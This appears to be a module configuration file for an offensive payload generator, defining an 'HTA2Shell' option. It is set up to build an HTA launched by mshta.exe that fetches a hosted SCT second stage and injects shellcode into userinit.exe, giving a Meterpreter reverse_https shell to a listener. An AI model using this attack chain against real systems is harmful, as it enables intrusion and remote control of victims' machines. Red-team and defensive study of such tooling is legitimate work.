[Type]
name: HTA2Shell
info: COM Scriptlet (SCT) using MSHTA
template: ./template/SCT/HTA-Shellcode.template
runInfo: mshta.exe ${Output:var}

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[HostedSct]
var: payload.sct
allowWilds: True
help: The file name of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 80
allowWilds: True
help: Your listener port

[Process]
var: userinit.exe
allowWilds: True
help: May be any .exe in //System32/

[Payload]
var: windows/meterpreter/reverse_https
help: The type of payload

[Output]
var: HTAtoShell.hta
allowWilds: True